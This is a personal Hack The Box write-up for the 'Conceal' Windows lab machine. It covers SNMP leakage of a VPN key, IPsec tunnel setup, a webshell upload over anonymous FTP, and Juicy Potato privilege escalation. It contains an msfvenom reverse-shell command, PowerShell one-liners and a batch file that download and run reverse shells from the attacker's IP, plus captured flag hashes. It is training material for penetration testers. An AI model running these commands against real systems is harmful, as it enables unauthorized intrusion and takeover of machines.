<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>conceal</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#conceal">conceal</a></p>
<ol>
<li><a href="#nmap Automator">nmap Automator</a></li>
<li><a href="#setting up vpn tunnel">setting up vpn tunnel</a></li>
<ol>
<li><a href="#snmpwalk">snmpwalk</a></li>
<ol>
<li><a href="#crackstation">crackstation</a></li>
</ol>
<li><a href="#snmp-check">snmp-check</a></li>
<li><a href="#ike-scan">ike-scan</a></li>
<li><a href="#strongswan">strongswan</a></li>
<ol>
<li><a href="#vi /etc/ipsec.secrets">vi /etc/ipsec.secrets</a></li>
<li><a href="#vi ipsec.conf">vi ipsec.conf</a></li>
<li><a href="#start tunnel">start tunnel</a></li>
<ol>
<li><a href="#troubleshooting with netgate">troubleshooting with netgate</a></li>
</ol>
</ol>
<li><a href="#tunnel success verification">tunnel success verification</a></li>
</ol>
<li><a href="#potential tunnel issue fixes">potential tunnel issue fixes</a></li>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#http">http</a></li>
<li><a href="#gobuster">gobuster</a></li>
<li><a href="#ftp">ftp</a></li>
<ol>
<li><a href="#test.aspx">test.aspx</a></li>
<li><a href="#test.asp">test.asp</a></li>
<ol>
<li><a href="#revshell.asp">revshell.asp</a></li>
</ol>
</ol>
<li><a href="#tennc webshell github">tennc webshell github</a></li>
<ol>
<li><a href="#picking webshell payload">picking webshell payload</a></li>
<li><a href="#nishang reverse shell">nishang reverse shell</a></li>
<li><a href="#reverse shell">reverse shell</a></li>
</ol>
</ol>
<li><a href="#privesc">privesc</a></li>
<ol>
<li><a href="#windows-exploit suggester">windows-exploit suggester</a></li>
<ol>
<li><a href="#systeminfo">systeminfo</a></li>
</ol>
<li><a href="#whoami /priv">whoami /priv</a></li>
<li><a href="#juicy potato">juicy potato</a></li>
<ol>
<li><a href="#rerun with correct CLSID">rerun with correct CLSID</a></li>
<li><a href="#rev shell to nt auth">rev shell to nt auth</a></li>
</ol>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page" id="conceal"><h1><b><u>conceal</u></b></h1><img alt="images/1384-1.png" src="images/1384-1.png"/><br/><img alt="images/1384-2.png" src="images/1384-2.png"/><br/><span style="color:#24ff00;">This box is unique because running nmap you notice no services are available on the box after a tcp scan<br/><br/> UDP scan shows port 500 open running isakmp, which is a key exchange protcol, looks like we need to connect to the box via a vpn tunnel to this box in order to enumerate its </span><strong><span style="color:#24ff00;">services</span></strong></div>
<div class="page" id="nmap Automator"><h1><b><u>nmap Automator</u></b></h1><span style="color:#24ff00;">strangely enough, </span><span style="color:#ffa500;">all the services</span><span style="color:#24ff00;"> on the box besides the isakmp UDP service seem to be... </span><span style="color:#ff0000;">concealed</span><span style="color:#24ff00;">.</span><br/><br/><img alt="images/1385-1.png" src="images/1385-1.png"/><span style="color:#00ff00;"><br/><br/></span><img alt="images/1385-2.png" src="images/1385-2.png"/><br/> <br/> <br/> However, the UDP scan shows <span style="color:#ffa500;">port 500 </span><span style="color:#00ff00;">open running </span><span style="color:#ffa500;">isakmp</span><span style="color:#00ff00;">, which is a key exchange protcol, looks like we need to connect via a vpn tunnel to this box in order to enumerate its services<br/></span><img alt="images/1385-3.png" src="images/1385-3.png"/></div>
<div class="page" id="setting up vpn tunnel"><h1><b><u>setting up vpn tunnel</u></b></h1><span style="color:#ffa500;">snmpwalk<br/>snmp-check<br/>ike-scan<br/>strongswan setup<br/>tunnel succes verification</span></div>
<div class="page" id="snmpwalk"><h1><b><u>snmpwalk</u></b></h1><img alt="images/1386-1.png" src="images/1386-1.png"/><br/><br/><br/><img alt="images/1386-2.png" src="images/1386-2.png"/><br/><span style="color:#24ff00;">first couple of lines leak a preshared key:<br/><br/>IKE VPN password PSK -</span> <strong><span style="color:#ffff00;">9C8B1A372B1878851BE2C097031B6E43</span></strong><br/><img alt="images/1386-3.png" src="images/1386-3.png"/></div>
<div class="page" id="crackstation"><h1><b><u>crackstation</u></b></h1><span style="color:#24ff00;">lets plug this hash into crackstation and see what we get</span><br/><br/><img alt="images/1387-1.png" src="images/1387-1.png"/><br/><br/><strong><span style="color:#ffff00;">Dudecake1!</span></strong></div>
<div class="page" id="snmp-check"><h1><b><u>snmp-check</u></b></h1><span style="color:#ffa500;">smpt-check</span><span style="color:#24ff00;"> is incredibly useful for further enumeration on snmp services</span><strong><br/></strong><br/><img alt="images/1388-1.png" src="images/1388-1.png"/><br/><br/><strong><span style="color:#00ff00;">from this we see <br/>ftp is running<br/>http is running<br/>smb is running </span></strong><br/><br/><img alt="images/1388-2.png" src="images/1388-2.png"/><br/><br/><strong><span style="color:#00ff00;">161 is snmp<br/>500 is ipsec-ike (will abuse)<br/>4500 is ipsec ISAKMP (will abuse)<br/>5355 is LLMNR reposder abuses (does net-bios queries)<br/>137 smb stuff<br/>138 smb stuff</span></strong><br/>1900 (UPNP)<br/>others are unknown/ephemeral services<br/></div>
<div class="page" id="ike-scan"><h1><b><u>ike-scan</u></b></h1>-M for multi-line<br/><br/><img alt="images/1389-1.png" src="images/1389-1.png"/><br/><br/><span style="color:#24ff00;">SA is security association: SA=<br/></span><span style="color:#ffa500;">(Enc=3DES <br/>Hash=SHA1 <br/>Group=2:modp1024 <br/>Auth=PSK (Dudecake1!)<br/>LifeType=Seconds <br/>LifeDuration(4)=0x00007080) </span><span style="color:#24ff00;">this is in hex so convert it </span><br/><img alt="images/1389-2.png" src="images/1389-2.png"/><br/><span style="color:#24ff00;">LifeDuration(4)=28800)</span> (8 hours)<br/><br/><span style="color:#24ff00;">ALSO NOTE</span><br/><img alt="images/1389-3.png" src="images/1389-3.png"/><br/><span style="color:#24ff00;">ike is version 1 (we'll need this as well for our tunnel)</span><br/><br/><span style="color:#24ff00;">we'll need this info for when we </span><span style="color:#ffff00;">build</span><span style="color:#24ff00;"> our own</span><span style="color:#ffff00;"> vpn tunnel</span><span style="color:#24ff00;"> to the box</span><br/></div>
<div class="page" id="strongswan"><h1><b><u>strongswan</u></b></h1><span style="color:#ffa500;">strongswan</span><span style="color:#24ff00;"> is an ipsec tunneling program</span><br/><img alt="images/1390-1.png" src="images/1390-1.png"/><br/><br/><span style="color:#24ff00;">establishing an </span><span style="color:#ffff00;">ipsec tunnel</span><span style="color:#24ff00;"> is done through 2 configuration files </span><br/><br/><strong><span style="color:#24ff00;">first</span></strong><br/><span style="color:#ffa500;">ipsec.secrets manual:</span><br/><img alt="images/1390-2.png" src="images/1390-2.png"/><br/><br/><span style="color:#24ff00;">we have to update our </span><span style="color:#ffa500;">/etc/ipsec.secrets</span><span style="color:#24ff00;"> file with the following:</span><br/><img alt="images/1390-3.png" src="images/1390-3.png"/><br/><span style="color:#ffa500;">10.10.10.116 %any : PSK "Dudecake1!"</span><br/><br/><strong><span style="color:#24ff00;">second</span></strong><span style="color:#24ff00;"> <br/></span><span style="color:#ffa500;">ipsec.conf manual</span><br/><br/></div>
<div class="page" id="vi /etc/ipsec.secrets"><h1><b><u>vi /etc/ipsec.secrets</u></b></h1><img alt="images/1391-1.png" src="images/1391-1.png"/><br/><br/><img alt="images/1391-2.png" src="images/1391-2.png"/><br/><br/><span style="color:#24ff00;">we add the include .inc file and our PSK from before</span></div>
<div class="page" id="vi ipsec.conf"><h1><b><u>vi ipsec.conf</u></b></h1><span style="color:#24ff00;">to configure our </span><span style="color:#ffa500;">tunnel</span><span style="color:#24ff00;"> we're going to need to add a </span><span style="color:#ffff00;">connection profile</span><span style="color:#24ff00;"> to our </span><span style="color:#ffa500;">ipsec.conf </span><span style="color:#24ff00;">file<br/><br/>first we declare our </span><span style="color:#ffff00;">tunnel name</span><span style="color:#24ff00;"> </span><span style="color:#ffa500;">conceal</span><br/><img alt="images/1392-1.png" src="images/1392-1.png"/><br/><br/><br/><img alt="images/1392-2.png" src="images/1392-2.png"/><br/><strong><span style="color:#ffa500;">type</span></strong>:<span style="color:#24ff00;"> we use </span><span style="color:#ffff00;">trial and error </span><span style="color:#24ff00;">on the tunnel being either </span><strong><span style="color:#ffa500;">tunnel</span></strong><span style="color:#24ff00;"> OR </span><strong><span style="color:#ffa500;">transport</span></strong><span style="color:#24ff00;"> type and see which one works<br/></span><img alt="images/1392-3.png" src="images/1392-3.png"/><br/><br/>next we set <span style="color:#ffa500;">keyexchange</span><span style="color:#24ff00;"> <br/>because our ike-scan reported </span><img alt="images/1392-4.png" src="images/1392-4.png"/><br/><img alt="images/1392-5.png" src="images/1392-5.png"/><br/><br/><br/>next we set <span style="color:#ffa500;">left</span><span style="color:#24ff00;"> (think left side of the connection or our attacking machine IP)<br/></span><img alt="images/1392-6.png" src="images/1392-6.png"/><br/><br/>next we set <span style="color:#ffa500;">right</span>,<span style="color:#24ff00;"> or conceal's IP address<br/></span><img alt="images/1392-7.png" src="images/1392-7.png"/><br/><br/>next we set <span style="color:#ffff00;">authentication type</span><span style="color:#24ff00;"> which is </span><span style="color:#ffa500;">authby</span><span style="color:#24ff00;"> to </span><span style="color:#ffa500;">pre-shared key</span><span style="color:#24ff00;"> or '</span><span style="color:#ffa500;">psk</span><span style="color:#24ff00;">'<br/></span><img alt="images/1392-8.png" src="images/1392-8.png"/><br/><br/>next we set the <span style="color:#ffff00;">encapsulting security payload </span><span style="color:#24ff00;">or ‘</span><span style="color:#ffa500;">esp</span><span style="color:#24ff00;">’ which is </span><img alt="images/1392-9.png" src="images/1392-9.png"/> and <img alt="images/1392-10.png" src="images/1392-10.png"/><br/><img alt="images/1392-11.png" src="images/1392-11.png"/><br/><br/>next we set the<span style="color:#ffff00;"> internet key exchange </span><span style="color:#24ff00;">or</span><span style="color:#ffa500;"> IKE key</span><span style="color:#24ff00;"> which is </span><span style="color:#ffa500;">3des-sha1-modp24</span><span style="color:#24ff00;"> </span><img alt="images/1392-12.png" src="images/1392-12.png"/><br/><img alt="images/1392-13.png" src="images/1392-13.png"/><br/><br/>next we do <span style="color:#ffa500;">lifetime</span><span style="color:#24ff00;"> </span><img alt="images/1392-14.png" src="images/1392-14.png"/> which we know is <span style="color:#ffff00;">8 hours</span><span style="color:#24ff00;"> from our hex to decimal to hours</span><br/><img alt="images/1392-15.png" src="images/1392-15.png"/><br/><br/><span style="color:#24ff00;">finally we add and </span><span style="color:#ffa500;">auto=start</span> <span style="color:#24ff00;">parameter</span><br/><br/><strong><span style="color:#24ff00;">our connection tunnel profile looks like this:</span></strong><br/><img alt="images/1392-16.png" src="images/1392-16.png"/><br/><br/><span style="color:#24ff00;">also its nice to add </span><span style="color:#ffa500;">fragmentation=yes</span><span style="color:#24ff00;"> since it is supported in the </span><span style="color:#ffa500;">ike-scan</span><br/><img alt="images/1392-17.png" src="images/1392-17.png"/><br/><br/><img alt="images/1392-18.png" src="images/1392-18.png"/><br/><br/></div>
<div class="page" id="start tunnel"><h1><b><u>start tunnel</u></b></h1><span style="color:#24ff00;">to start the tunnel using </span><span style="color:#ffa500;">strongswan</span><span style="color:#24ff00;">, issue the following</span><br/><br/><strong><span style="color:#ffa500;">ipsec start --nofork</span></strong><br/><img alt="images/1393-1.png" src="images/1393-1.png"/><br/><br/><span style="color:#24ff00;">unfortunately we get an error message </span><span style="color:#ff0000;">INVALID_ID_INFORMATION</span><span style="color:#ffff00;"> (see child note for troubleshoot)</span><br/><img alt="images/1393-2.png" src="images/1393-2.png"/><br/><br/><br/><span style="color:#24ff00;">(new connection profile)</span><br/><img alt="images/1393-3.png" src="images/1393-3.png"/><br/><br/><span style="color:#24ff00;">and now we see </span><span style="color:#ffa500;">ipsec start --nofork</span><span style="color:#24ff00;"> ending with no errors:</span><br/><img alt="images/1393-4.png" src="images/1393-4.png"/></div>
<div class="page" id="troubleshooting with netgate"><h1><b><u>troubleshooting with netgate</u></b></h1><span style="color:#24ff00;">ippsec recommends using </span><span style="color:#ffff00;">netgate ipsec</span><span style="color:#24ff00;"> to troubleshoot tunnel error messages that shows all the common error messages</span><br/><br/><img alt="images/1394-1.png" src="images/1394-1.png"/><br/><br/><br/><br/><img alt="images/1394-2.png" src="images/1394-2.png"/>+<br/><br/><span style="color:#24ff00;">by default this tunnel is connecting via </span><span style="color:#ffa500;">TCP</span><span style="color:#24ff00;">, however from our nmap scans we know our tunnel's TCP protocol is only configured on the windows side and not our attack machine's side</span><br/><br/><span style="color:#24ff00;">as proof, if we run nmap scan sending a SYN packet via nmap to port 445 we see that it is filtered, however if we specifiy TCP, we see it is open<br/></span><img alt="images/1394-3.png" src="images/1394-3.png"/><br/><br/>the solution is to specifiy TCP on our tunnel via <span style="color:#ffa500;">leftprotoport</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">rightprotoport</span><br/><img alt="images/1394-4.png" src="images/1394-4.png"/><br/><br/><br/><br/>updating our <span style="color:#ffa500;">ipsec.conf</span><span style="color:#24ff00;"> file conceal connection profile with</span><br/><img alt="images/1394-5.png" src="images/1394-5.png"/><br/><br/><br/><br/></div>
<div class="page" id="tunnel success verification"><h1><b><u>tunnel success verification</u></b></h1><span style="color:#24ff00;">before tunnel:<br/></span><img alt="images/1395-1.png" src="images/1395-1.png"/><br/><br/>after tunnel <br/><span style="color:#ffa500;">-sT</span><span style="color:#24ff00;"> for tcp scan (syn scans come  back filtered)<br/></span><img alt="images/1395-2.png" src="images/1395-2.png"/></div>
<div class="page" id="potential tunnel issue fixes"><h1><b><u>potential tunnel issue fixes</u></b></h1><span style="color:#24ff00;">because we are tunneling through </span><span style="color:#ffff00;">2 separate VPNS</span><span style="color:#24ff00;">, we have about </span><span style="color:#ffff00;">7%</span><span style="color:#24ff00;"> overhead from the data we're sending around which may lead to connection problems with our tunnel<br/><br/></span><img alt="images/1407-1.png" src="images/1407-1.png"/><br/><br/><img alt="images/1407-2.png" src="images/1407-2.png"/><br/><br/>you can solve this issue by lowering the <span style="color:#ffa500;">mtu</span> <span style="color:#24ff00;">or</span><span style="color:#ffff00;"> maximum transmission unit</span><br/><span style="color:#ffa500;">ifconfig tun0 mtu 1000</span><br/><img alt="images/1407-3.png" src="images/1407-3.png"/><br/><img alt="images/1407-4.png" src="images/1407-4.png"/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">doing some box enumeration and connecting to the box's ftp server via anonymous login<br/><br/>uploading a webshell with tennc's github repo<br/><br/>using that webshell to call back a reverse powershell with nishang's Invoke-PowershellTCP.ps1<br/><br/></span></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><img alt="images/1398-1.png" src="images/1398-1.png"/></div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><span style="color:#24ff00;">there is an </span><span style="color:#ffa500;">/upload</span><span style="color:#24ff00;"> directory, probably stores to the ftp server contents</span><br/><img alt="images/1399-1.png" src="images/1399-1.png"/></div>
<div class="page" id="ftp"><h1><b><u>ftp</u></b></h1><span style="color:#24ff00;">nmap scan showed </span><span style="color:#ffff00;">annonymous login</span><span style="color:#24ff00;"> was configured on the ftp server</span><br/><br/><br/><img alt="images/1397-1.png" src="images/1397-1.png"/><br/><br/><br/><span style="color:#24ff00;">now to generate a </span><span style="color:#ffa500;">test.txt</span><span style="color:#24ff00;"> file and upload it to the ftp server</span><br/><img alt="images/1397-2.png" src="images/1397-2.png"/><br/><br/><span style="color:#24ff00;">and we see our file is in the </span><span style="color:#ffa500;">/upload</span><span style="color:#24ff00;"> directory of our webserver</span><br/><img alt="images/1397-3.png" src="images/1397-3.png"/></div>
<div class="page" id="test.aspx"><h1><b><u>test.aspx</u></b></h1><span style="color:#24ff00;">uploading</span><span style="color:#ffa500;"> test.aspx</span><span style="color:#24ff00;"> to the ftp server gives us:</span><br/><img alt="images/1402-1.png" src="images/1402-1.png"/><br/><img alt="images/1402-2.png" src="images/1402-2.png"/><br/><span style="color:#24ff00;">says the extension configuration caused the page to not get served, meaning the</span><span style="color:#ffa500;"> .aspx</span><span style="color:#24ff00;"> extension wont work, lets try .asp</span><br/></div>
<div class="page" id="test.asp"><h1><b><u>test.asp</u></b></h1><span style="color:#ffa500;">.asp </span><span style="color:#24ff00;">extension works!<br/><br/></span><img alt="images/1401-1.png" src="images/1401-1.png"/><br/>but it looks like the ftp server <span style="color:#ff0000;">deletes</span><span style="color:#24ff00;"> its contents every minute or so because after a short while:<br/></span><br/><img alt="images/1401-2.png" src="images/1401-2.png"/><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="revshell.asp"><h1><b><u>revshell.asp</u></b></h1><span style="color:#24ff00;">lets try to upload a reverse shell from msfvenom regardless</span><br/><br/><img alt="images/1403-1.png" src="images/1403-1.png"/><br/><br/><strong><span style="color:#ffa500;">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.62 LPORT=4444 -f asp &gt; shell.asp</span></strong><br/><img alt="images/1403-2.png" src="images/1403-2.png"/><br/><br/><span style="color:#24ff00;">this webshell gives us a </span><span style="color:#ff0000;">500 server error</span><span style="color:#24ff00;"> unfortunately because the </span><span style="color:#ff0000;">antivirus</span><span style="color:#24ff00;"> recognized the payload as malicious, however there are plenty of webshells to choose from online that should bypass this</span><br/><br/></div>
<div class="page" id="tennc webshell github"><h1><b><u>tennc webshell github</u></b></h1><span style="color:#24ff00;">theres a great github repository filled with </span><span style="color:#ffff00;">webshells</span><span style="color:#24ff00;"> we can use thanks to </span><span style="color:#ffff00;">ippsec</span> <span style="color:#24ff00;">found</span> <a href="https://github.com/tennc/webshell">here</a><br/><br/><img alt="images/1404-1.png" src="images/1404-1.png"/><br/><br/><img alt="images/1404-2.png" src="images/1404-2.png"/><br/><br/><span style="color:#24ff00;">to find .asp files we can simply </span><span style="color:#ffa500;">grep</span><span style="color:#24ff00;"> for them</span> <br/><span style="color:#ffa500;">find . | grep .asp$</span><br/><span style="color:#24ff00;">(</span><span style="color:#ffa500;">$ </span><span style="color:#24ff00;">to return results where .asp is at the end of the filename)</span><br/><img alt="images/1404-3.png" src="images/1404-3.png"/><br/><img alt="images/1404-4.png" src="images/1404-4.png"/><img alt="images/1404-5.png" src="images/1404-5.png"/></div>
<div class="page" id="picking webshell payload"><h1><b><u>picking webshell payload</u></b></h1><span style="color:#24ff00;">webshell<br/></span><img alt="images/1405-1.png" src="images/1405-1.png"/><br/><br/><img alt="images/1405-2.png" src="images/1405-2.png"/><br/><br/>upload it to the ftp server<br/><span style="color:#ffa500;">put cmdasp.asp</span><br/><img alt="images/1405-3.png" src="images/1405-3.png"/><br/><br/><span style="color:#24ff00;">we see here that the </span><span style="color:#ff0000;">antivirus caught</span><span style="color:#24ff00;"> this payload, so we'll need another</span><br/><img alt="images/1405-4.png" src="images/1405-4.png"/><br/><br/><span style="color:#24ff00;">feel free to try random webshells and see which ones work, tennc's webshell has a huge variety to choose from, however this one worked for me</span><br/><br/><strong><span style="color:#24ff00;">we see we have command execution!</span></strong><br/><img alt="images/1405-5.png" src="images/1405-5.png"/><br/><br/><img alt="images/1405-6.png" src="images/1405-6.png"/><br/><img alt="images/1405-7.png" src="images/1405-7.png"/><br/><img alt="images/1405-8.png" src="images/1405-8.png"/><br/><br/></div>
<div class="page" id="nishang reverse shell"><h1><b><u>nishang reverse shell</u></b></h1><span style="color:#24ff00;">since the box's </span><span style="color:#ffa500;">ftp server</span><span style="color:#24ff00;"> clears itself everyfew minutes, its best to </span><span style="color:#ffff00;">upload</span><span style="color:#24ff00;"> a</span><span style="color:#ffa500;"> reverse shell</span><span style="color:#24ff00;"> in our </span><span style="color:#ffa500;">webshell</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">run</span><span style="color:#24ff00;"> it </span><span style="color:#ffff00;">before it gets cleared</span><span style="color:#24ff00;"> in order to get our </span><span style="color:#ffff00;">foothold</span><span style="color:#24ff00;"><br/><br/>first lets move nishang's </span><span style="color:#ffa500;">Invoke-PowershellTcp </span><span style="color:#24ff00;">over to our working directory</span><br/><img alt="images/1406-1.png" src="images/1406-1.png"/><br/><br/><span style="color:#24ff00;">edit the file and add the I</span><span style="color:#ffa500;">nvoke-PowerShellTcp</span><span style="color:#24ff00;"> command at the end of the script</span><br/><img alt="images/1406-2.png" src="images/1406-2.png"/><br/><br/><span style="color:#24ff00;">rename the </span><span style="color:#ffa500;">reverse shell script</span><span style="color:#24ff00;"> to something simple</span><br/><img alt="images/1406-3.png" src="images/1406-3.png"/><br/><br/><span style="color:#24ff00;">spin up the webserver</span><br/><img alt="images/1406-4.png" src="images/1406-4.png"/><br/><br/><span style="color:#24ff00;">now the hard and timely part of uploading and executing our nishang script before the webserver clears our webshell</span><br/><span style="color:#ffa500;">powershell "IEX(new-object net.webclient).downloadstring('http://10.10.14.62:5555/rev.ps1')</span><br/><img alt="images/1406-5.png" src="images/1406-5.png"/><br/><br/><img alt="images/1406-6.png" src="images/1406-6.png"/></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">andddd... we have our foothold!</span><br/><img alt="images/1410-1.png" src="images/1410-1.png"/></div>
<div class="page" id="privesc"><h1><b><u>privesc</u></b></h1><span style="color:#ffa500;">windows-exploit suggester<br/>whoami /priv<br/>juicy potato</span></div>
<div class="page" id="windows-exploit suggester"><h1><b><u>windows-exploit suggester</u></b></h1><span style="color:#24ff00;">a great go-to first privesc step on all windows boxes is to copy its </span><span style="color:#ffa500;">systeminfo</span><span style="color:#ffff00;"> output </span><span style="color:#24ff00;">and run </span><span style="color:#ffa500;">windows-exploit-suggester</span><span style="color:#24ff00;"> on it</span><br/><br/><img alt="images/1411-1.png" src="images/1411-1.png"/><br/><br/><span style="color:#ffa500;">./windows-exploit-suggester.py -d 2020-07-21-mssb.xls -i ~/Documents/htb/boxes/conceal/systeminfo</span><br/><span style="color:#24ff00;">where<br/></span><span style="color:#ffa500;">-d </span><span style="color:#24ff00;">specifies the database </span><span style="color:#ffa500;">windows-exploit-suggester.py</span><span style="color:#24ff00;"> uses to find exploit (good to update before running with )<br/></span><span style="color:#ffa500;">-i</span><span style="color:#24ff00;"> specifies the </span><span style="color:#ffa500;">systeminfo</span><span style="color:#24ff00;"> results copied into a text file</span><br/><br/><img alt="images/1411-2.png" src="images/1411-2.png"/><br/><strong><span style="color:#24ff00;">full report:</span></strong><br/><img alt="images/1411-3.png" src="images/1411-3.png"/><br/><img alt="images/1411-4.png" src="images/1411-4.png"/><br/><img alt="images/1411-5.png" src="images/1411-5.png"/></div>
<div class="page" id="systeminfo"><h1><b><u>systeminfo</u></b></h1><span style="color:#24ff00;">we can use this for our </span><span style="color:#ffa500;">windows-exploit-suggestor</span><span style="color:#24ff00;"> if we need to down the line:</span><br/><br/><span style="color:#ffff00;"><div class = "codebox"><div style="background-color: #001b33; padding: 10px; border: 1px solid green;">
 Host Name:                 CONCEAL<br/>OS Name:                   Microsoft Windows 10 Enterprise<br/>OS Version:                10.0.15063 N/A Build 15063<br/>OS Manufacturer:           Microsoft Corporation<br/>OS Configuration:          Standalone Workstation<br/>OS Build Type:             Multiprocessor Free<br/>Registered Owner:          Windows User<br/>Registered Organization:   <br/>Product ID:                00329-00000-00003-AA343<br/>Original Install Date:     12/10/2018, 20:04:27<br/>System Boot Time:          21/07/2020, 03:29:21<br/>System Manufacturer:       VMware, Inc.<br/>System Model:              VMware Virtual Platform<br/>System Type:               x64-based PC<br/>Processor(s):              1 Processor(s) Installed.<br/>                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz<br/>BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018<br/>Windows Directory:         C:\Windows<br/>System Directory:          C:\Windows\system32<br/>Boot Device:               \Device\HarddiskVolume1<br/>System Locale:             en-gb;English (United Kingdom)<br/>Input Locale:              en-gb;English (United Kingdom)<br/>Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London<br/>Total Physical Memory:     2,047 MB<br/>Available Physical Memory: 1,292 MB<br/>Virtual Memory: Max Size:  3,199 MB<br/>Virtual Memory: Available: 2,382 MB<br/>Virtual Memory: In Use:    817 MB<br/>Page File Location(s):     C:\pagefile.sys<br/>Domain:                    WORKGROUP<br/>Logon Server:              N/A<br/>Hotfix(s):                 N/A<br/>Network Card(s):           1 NIC(s) Installed.<br/>                           [01]: Intel(R) 82574L Gigabit Network Connection<br/>                                 Connection Name: Ethernet0<br/>                                 DHCP Enabled:    No<br/>                                 IP address(es)<br/>                                 [01]: 10.10.10.116<br/>                                 [02]: fe80::9074:409:94e8:e84e<br/>                                 [03]: dead:beef::2d07:bc3a:2c18:6fa6<br/>                                 [04]: dead:beef::9074:409:94e8:e84e<br/>Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</div></div></span></div>
<div class="page" id="whoami /priv"><h1><b><u>whoami /priv</u></b></h1><span style="color:#24ff00;">another smart enumeration step (before busting our </span><span style="color:#ffa500;">WinPEAS</span><span style="color:#24ff00;">, etc) is to see what kind of </span><span style="color:#ffff00;">privileges</span><span style="color:#24ff00;"> our owned user has with </span><span style="color:#ffa500;">whoami /priv</span><br/><br/><img alt="images/1413-1.png" src="images/1413-1.png"/><br/><br/><span style="color:#ffa500;">---&gt;</span><img alt="images/1413-2.png" src="images/1413-2.png"/><br/><span style="color:#24ff00;">this permission usually points to a vulnerability to the popular</span> <span style="color:#ffa500;">juicy potato</span><span style="color:#24ff00;"> exploit, lets try that </span></div>
<div class="page" id="juicy potato"><h1><b><u>juicy potato</u></b></h1><span style="color:#ffa500;">Juicy Potato</span><span style="color:#24ff00;"> requires 3 steps to run manually:<br/>1)upload </span><span style="color:#ffa500;">juicy potato </span><span style="color:#24ff00;">to our victim, <br/>2)upload a </span><span style="color:#ffa500;">batch script</span><span style="color:#24ff00;"> we can write locally to our victim for juicy potato to run as administrator when it executes</span><br/><span style="color:#24ff00;">3)run </span><span style="color:#ffa500;">juicy potato</span><br/><br/><span style="color:#24ff00;">1) </span><br/><span style="color:#ffa500;">powershell IEX(new-object net.webclient).downloadfile('http://10.10.14.62:5555/jp.exe','C:\Users\Destitute\Desktop\jp.exe')</span><br/><span style="color:#24ff00;">and make a copy of our nishang shell and configure the Invoke-PowerShellTcp command to connect to a different numbered port</span><br/><span style="color:#ffa500;">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.62 -Port 9002</span><br/><img alt="images/1417-1.png" src="images/1417-1.png"/><br/><img alt="images/1417-2.png" src="images/1417-2.png"/><br/><br/><span style="color:#24ff00;">2)</span> <br/><img alt="images/1417-3.png" src="images/1417-3.png"/><br/><span style="color:#ffa500;">@ECHO OFF<br/>PowerShell.exe -Command "IEX(new-object net.webclient).downloadstring('http://10.10.14.62:5555/revshell2.ps1')"<br/>PAUSE</span><br/><img alt="images/1417-4.png" src="images/1417-4.png"/><br/><br/><span style="color:#24ff00;">download this bat to the victim</span><br/><span style="color:#ffa500;">powershell IEX(new-object net.webclient).downloadfile('http://10.10.14.62:5555/shell.bat','C:\Users\Destitute\Desktop\shell.bat')</span><br/><br/><span style="color:#24ff00;">3) </span><br/><span style="color:#ffa500;">./jp.exe -t * -p shell.bat -l 9001</span><br/><br/><img alt="images/1417-5.png" src="images/1417-5.png"/><br/><span style="color:#24ff00;">this error usually means the </span><span style="color:#ffa500;">CLSID</span> <span style="color:#24ff00;">or the software application's </span><span style="color:#ffff00;">class identifier</span><span style="color:#24ff00;"> errored out, there are many to choose from on the </span><span style="color:#ffa500;">juicy potato</span><span style="color:#24ff00;"> github repository </span><br/><br/><br/><br/></div>
<div class="page" id="rerun with correct CLSID"><h1><b><u>rerun with correct CLSID</u></b></h1><a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise">https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise</a><br/><br/><br/><span style="color:#ffa500;">{e60687f7-01a1-40aa-86ac-db1cbf673334}</span><br/><img alt="images/1419-1.png" src="images/1419-1.png"/><br/><br/><span style="color:#24ff00;">now we run juicy potato again and set the CLSID with </span><span style="color:#ffa500;">-c &lt;CLSID&gt;</span><br/><strong><span style="color:#ffa500;">./jp.exe -p shell.bat -l 9001 -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"</span></strong></div>
<div class="page" id="rev shell to nt auth"><h1><b><u>rev shell to nt auth</u></b></h1><span style="color:#24ff00;">and we're </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">!</span><br/><img alt="images/1420-1.png" src="images/1420-1.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1416-1.png" src="images/1416-1.png"/><span style="color:#ffff00;"><br/>6E9FDFE0DCB66E700FB9CB824AE5A6FF<br/><br/><img alt="images/1416-2.png" src="images/1416-2.png"/><br/>5737DD2EDC29B5B219BC43E60866BE08</span></div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><img alt="images/1414-1.png" src="images/1414-1.png"/></div>
</div></body></html>